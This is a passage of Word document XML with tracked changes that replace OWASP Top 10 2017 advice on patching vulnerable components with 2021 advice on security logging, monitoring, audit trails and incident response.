          <w:delText xml:space="preserve"> system (DBMS), applications, APIs and all components, runtime environments, and libraries.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7C9ACC71" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3269" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3270" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* If you do not scan for vulnerabilities regularly and subscribe to security bulletins related to the components you use.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="59A204E2" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3271" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3272" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* If you do not fix or upgrade the underlying platform, frameworks, and dependencies in a risk-based, timely fashion. This commonly happens in environments when patching is a monthly or quarterly task under change control, which leaves organizations open to many days or months of unnecessary exposure to fixed vulnerabilities.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5A8A6389" w14:textId="37A2396E" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3273" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3274" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* If</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3275" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    solutions can easily consume.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0A195BC2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3276" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="09E1E4EA" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3277" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3278" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Ensure log data is encoded correctly to prevent injections or</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3A17AAC4" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3279" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3280" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    attacks on the logging or monitoring systems.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="38FEFF2A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3281" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="298FBF8F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3282" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3283" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Ensure high-value transactions have an audit trail with integrity</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0AB48780" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3284" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3285" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    controls to prevent tampering or deletion, such as append-only</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4ABEF5F8" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3286" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3287" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    database tables or similar.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1AEEF4FA" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3288" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C38D20B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3289" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3290" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-   </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>DevSecOps</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> teams should establish effective monitoring and alerting</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0ADEC4D2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3291" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3292" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    such that suspicious activities are detected and responded to</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1F315115" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3293" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3294" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    quickly.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="42004D39" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3295" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="209F5F32" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3296" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3297" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Establish or adopt an incident response and recovery plan, such as</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1D13D2B0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3298" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3299" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    National Institute of Standards and Technology (NIST) 800-61r2 or later.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1C867565" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3300" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D5253CB" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3301" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3302" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>There are commercial and open-source application protection frameworks</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0A65841E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3303" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3304" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">such as the OWASP </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>ModSecurity</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> Core Rule Set, and open-source log</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="738A1FA1" w14:textId="45EB6E6A" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3305" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>correlation</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> software</w:t>
      </w:r>
      <w:del w:id="3306" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> developers do not test</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3307" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>, such as</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:del w:id="3308" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>compatibility of updated, upgraded, or patched libraries.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3309" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Elasticsearch, Logstash, Kibana (ELK)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="73F7C3CD" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3310" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3311" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* If you do not secure the components' configurations (see **A6:2017-Security Misconfiguration**).</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="14EC4E30" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3312" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3313" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>stack, that feature custom dashboards and alerting.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="031F93E0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveFrom w:id="3314" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveFromRangeStart w:id="3315" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923170"/>
    </w:p>
    <w:p w14:paraId="3C993E4E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveFrom w:id="3316" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveFrom w:id="3317" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">## How </w:t>
        </w:r>
      </w:moveFrom>
      <w:moveFromRangeEnd w:id="3315"/>
      <w:del w:id="3318" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>To Prevent</w:delText>
        </w:r>
      </w:del>
      <w:moveFromRangeStart w:id="3319" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923158"/>
    </w:p>
    <w:p w14:paraId="0D63E49F" w14:textId="2C11193A" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00841D1E" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3320" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveFrom w:id="3321" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">There </w:t>
        </w:r>
      </w:moveFrom>
      <w:moveFromRangeEnd w:id="3319"/>
      <w:del w:id="3322" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>should be a patch management process in place to:</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4C466A26" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3323" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3324" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* Remove unused dependencies, unnecessary features, components, files, and documentation.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="44630B19" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3325" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3326" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">* Continuously inventory the versions of both client-side and server-side components (e.g. frameworks, libraries) and their dependencies using tools like versions, DependencyCheck, retire.js, etc. </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="26AD8903" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3327" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3328" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* Continuously monitor sources like CVE and NVD for vulnerabilities in the components. Use software composition analysis tools to automate the process. Subscribe to email alerts for security vulnerabilities related to components you use.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6A6E0424" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3329" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3330" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* Only obtain components from official sources over secure links. Prefer signed packages to reduce the chance of including a modified, malicious component.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="19A1C0EE" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3331" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3332" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
